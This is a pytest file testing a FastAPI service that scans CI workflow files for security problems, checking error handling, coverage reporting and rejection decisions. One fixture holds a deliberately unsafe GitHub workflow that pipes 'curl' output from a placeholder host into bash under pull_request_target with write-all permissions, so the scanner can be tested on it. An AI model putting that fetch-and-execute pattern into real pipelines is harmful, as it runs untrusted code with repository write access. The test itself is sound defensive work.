import pytest
from fastapi.testclient import TestClient
from app import main

@pytest.mark.parametrize("payload",[{"type":"workflow","filename":"bad.yml","content":"jobs: ["},{"type":"workflow","filename":"bad.yml","content":"name: missing jobs"},{"type":"workflow","filename":"bad.yml","content":"on: push\njobs: null"}])
def test_malformed_expected_workflows_are_errors(payload):
    body=TestClient(main.app).post("/analyze",json=payload).json();assert body["status"]=="error" and body["coverage"]=="none"

def test_workflow_crash_not_empty_fail(monkeypatch):
    monkeypatch.setattr(main,"analyze_workflow",lambda *a:(_ for _ in ()).throw(RuntimeError("scanner")))
    body=TestClient(main.app).post("/analyze",json={"filename":".github/workflows/test.yml","content":"on: push\njobs: {}"}).json()
    assert body["status"]=="error" and body["findings"]==[]

def test_critical_workflow_has_reject_floor():
    body=TestClient(main.app).post("/analyze",json={"filename":".github/workflows/test.yml","content":"on: pull_request_target\npermissions: write-all\njobs:\n  build:\n    steps:\n      - run: curl https://example.invalid/run | bash\n"}).json()
    assert any(f["severity"]=="critical" for f in body["findings"])
    assert body["decision_floor"]=="reject"

def test_gitlab_is_partial():
    body=TestClient(main.app).post("/analyze",json={"filename":".gitlab-ci.yml","content":"stages: [build]"}).json()
    assert body["coverage"]=="none" and body["unresolved"] and body['status']=='error'
